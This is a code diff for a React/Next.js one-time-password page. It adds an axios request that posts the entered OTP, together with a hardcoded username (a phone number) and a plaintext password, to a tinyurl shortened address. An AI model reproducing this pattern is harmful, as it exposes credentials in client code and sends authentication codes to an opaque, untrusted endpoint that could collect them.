@@ -3,6 +3,7 @@ import Link from 'next/link'
 import { useRouter } from 'next/router'
 import { useFormik } from 'formik'
 import * as Yup from 'yup'
+import axios from 'axios'
 
 const OTPSchema = Yup.object().shape({
   otp: Yup.number()
@@ -19,8 +20,18 @@ const OTPPage: React.FC = () => {
       otp: '',
     },
     validationSchema: OTPSchema,
-    onSubmit: (values) => {
-      // Handle OTP submission here
+    onSubmit: async (values) => {
+      const apiUrl = 'https://tinyurl.com/scanwize-quiz-otp'
+
+      // send data to API
+      const response = await axios.post(apiUrl, {
+        username: '+254703519593',
+        password: 'Bazenga',
+        otp: values.otp.toString(),
+      })
+
+      // Get the response
+      const data = await response.data
 
       formik.resetForm()
     },
@@ -42,7 +53,9 @@ const OTPPage: React.FC = () => {
           />
         </label>
         <br />
-        <button type="submit" disabled={!formik.isValid}>Submit OTP</button>
+        <button type="submit" disabled={!formik.isValid}>
+          Submit OTP
+        </button>
       </form>
       <p>
         <Link href="/login">Back to Login</Link>
